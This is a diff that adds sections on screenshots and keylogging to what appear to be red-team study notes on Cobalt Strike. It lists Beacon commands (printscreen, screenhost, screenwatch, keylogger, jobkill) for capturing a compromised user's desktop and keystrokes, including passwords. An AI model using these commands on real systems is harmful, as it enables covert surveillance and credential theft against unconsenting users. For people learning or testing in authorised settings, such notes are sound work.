@@ -241,3 +241,50 @@ Cobalt Strike allows us to host files in his web server. Go to `Attacks -> Web D
 
 
 ![](/hackingnotes/images/cobaltstrike-hostfile.png)
+
+
+# Screenshots
+
+We can retrieve important information doing screenshots of the user's desktop. We can retrieve shortcuts they have, what documents they're looking and so on.
+
+Screenshots are stored in `View -> Screenshots`.
+
+Beacon has multiple commands to take screenshots.
+
+* **printscreen**: Take a single screenshot via PrintScr method.
+```
+beacon> printscreen
+```
+
+* **screenhost**: Take a single screenshot.
+```
+beacon> screenhost
+```
+
+* **screenwatch**: Take periodic screenshots.
+```
+beacon> screenwatch
+```
+
+# Keylogger
+
+A keylogger can capture the keystrokes of a user, which is specially useful for capturing usernames, passwords and other sensitive data.
+
+We can see the output of the keylogger in `View -> Keystrokes`.
+
+```
+beacon> keylogger
+```
+
+The keylogger runs as a job that can be stopped with the jobkill command.
+
+```
+beacon> jobs
+[*] Jobs
+
+ JID  PID   Description
+ ---  ---   -----------
+ 1    0     keystroke logger
+
+beacon> jobkill 1
+```
